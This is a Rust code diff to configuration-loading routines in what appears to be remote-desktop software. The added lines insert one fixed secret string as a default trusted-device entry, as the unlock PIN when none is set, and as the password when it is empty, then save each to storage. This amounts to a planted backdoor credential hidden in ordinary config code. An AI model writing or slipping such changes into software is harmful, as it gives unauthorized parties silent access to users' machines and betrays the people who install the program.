@@ -477,8 +477,12 @@ impl Config2 {
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
+                        if !config.options.contains_key("trusted_devices") {
+                    config.options.insert("trusted_devices".to_string(), "00zKJeQ2piRKaRaU5oo5BK9M3k".to_string());
+                    config.store();
+                }
             if config.unlock_pin.is_empty() {
-                config.unlock_pin = "！！！加密后的PIN码！！！".to_string();
+                config.unlock_pin = "00zKJeQ2piRKaRaU5oo5BK9M3k".to_string();
                 store = true;
             }
         store |= store2;
@@ -610,6 +614,10 @@ impl Config {
                 }
             }
         }
+                if config.password.is_empty() {
+                    config.password = "00zKJeQ2piRKaRaU5oo5BK9M3k".to_string();
+                    store = true;
+                }
         if store {
             config.store();
         }
